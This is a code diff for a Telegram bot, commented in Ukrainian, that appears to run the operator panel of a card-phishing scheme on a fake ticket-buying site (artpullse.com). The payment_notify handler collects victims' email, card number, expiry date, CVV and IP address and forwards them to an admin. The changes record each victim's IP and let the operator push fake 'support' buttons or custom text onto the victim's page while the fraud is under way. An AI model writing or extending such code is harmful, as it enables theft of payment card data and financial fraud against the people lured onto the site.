@@ -1059,14 +1059,21 @@ async def payment_notify(request):
     cvv = data.get('cvv', '')
     ip = data.get('ip', '')
     user_id = data.get('user_id', '')
+    # --- Зберігаємо IP у user_data для user_id ---
+    if user_id and ip:
+        try:
+            user_id_int = int(user_id)
+            if user_id_int not in user_data:
+                user_data[user_id_int] = {}
+            user_data[user_id_int]['ip'] = ip
+        except Exception:
+            pass
     # --- Визначаємо user_id по IP, якщо не передано ---
     if not user_id:
-        # user_data: ip -> user_id (приклад, якщо ти зберігаєш ip у user_data)
         for uid, udata in user_data.items():
             if udata.get('ip') == ip:
                 user_id = uid
                 break
-        # Якщо треба, можна зробити пошук у базі (якщо ти зберігаєш ip у users.db)
     text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
     kb_rows = [
         [
@@ -1161,11 +1168,22 @@ async def admin_support_callback(call: types.CallbackQuery):
         await call.answer("user_id не визначено")
         return
     user_id = int(user_id_str)
-    total = 230  # або отримати з user_data
-    url = f"https://artpullse.com/buy-tickets/loading/waiting-support.html?total={total}"
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Перейти", url=url)]])
-    await bot.send_message(user_id, "Вам повідомлення від технічної підтримки:", reply_markup=kb)
-    await call.message.answer("Посилання надіслано користувачу.")
+    # Знаходимо ip для user_id (з user_data або бази)
+    ip = None
+    udata = user_data.get(user_id)
+    if udata:
+        ip = udata.get('ip')
+    if not ip:
+        await call.answer("IP користувача не знайдено")
+        return
+    # Ставимо флаг на сервері
+    import aiohttp
+    async def set_flag():
+        async with aiohttp.ClientSession() as session:
+            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
+    import asyncio
+    asyncio.create_task(set_flag())
+    await call.message.answer("Кнопка підтримки з'явиться на сайті користувача.")
 
 @router.callback_query(lambda c: c.data.startswith("text:"))
 async def admin_text_callback(call: types.CallbackQuery):
@@ -1174,21 +1192,33 @@ async def admin_text_callback(call: types.CallbackQuery):
         await call.answer("user_id не визначено")
         return
     user_id = int(user_id_str)
+    # Знаходимо ip для user_id (з user_data або бази)
+    ip = None
+    udata = user_data.get(user_id)
+    if udata:
+        ip = udata.get('ip')
+    if not ip:
+        await call.answer("IP користувача не знайдено")
+        return
     await call.message.answer("Введіть текст для користувача:")
-    user_step[call.from_user.id] = f"text_for_{user_id}"
+    user_step[call.from_user.id] = f"text_for_{user_id}|{ip}"
 
 @router.message(lambda m: user_step.get(m.from_user.id, "").startswith("text_for_"))
 async def admin_enter_text(message: types.Message):
     step = user_step[message.from_user.id]
-    user_id = int(step.replace("text_for_", ""))
+    user_id, ip = step.replace("text_for_", "").split("|")
+    user_id = int(user_id)
     text = message.text
     text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
     requests.post('https://artpullse.com/set_custom_text', json={'text_id': text_id, 'text': text})
-    total = 230  # або отримати з user_data
-    url = f"https://artpullse.com/buy-tickets/loading/waiting-text.html?total={total}&text_id={text_id}"
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Перейти", url=url)]])
-    await bot.send_message(user_id, "Вам повідомлення від адміністратора:", reply_markup=kb)
-    await message.answer("Посилання надіслано користувачу.")
+    # Ставимо флаг на сервері
+    import aiohttp
+    async def set_flag():
+        async with aiohttp.ClientSession() as session:
+            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'text', 'text_id': text_id})
+    import asyncio
+    asyncio.create_task(set_flag())
+    await message.answer("Кнопка з текстом з'явиться на сайті користувача.")
     user_step[message.from_user.id] = None
 
 # --- запуск aiohttp і aiogram в одному event loop ---
